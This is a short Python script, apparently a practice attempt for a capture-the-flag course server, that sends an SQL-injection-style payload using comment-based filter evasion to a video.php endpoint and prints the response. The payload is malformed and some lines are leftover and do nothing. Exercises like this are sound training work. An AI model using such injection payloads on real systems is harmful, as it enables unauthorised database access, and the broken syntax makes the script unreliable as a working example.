import requests
url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'
payload = '/**/union/**/1==1'

url += payload
str1 = 1
str2 = 2
payload = str1 + str2

result = requests.get(url, verify=False)

print(result.text)
#print('--------------')
#print(result.headers)

for i in range(0, 2):
    print('')
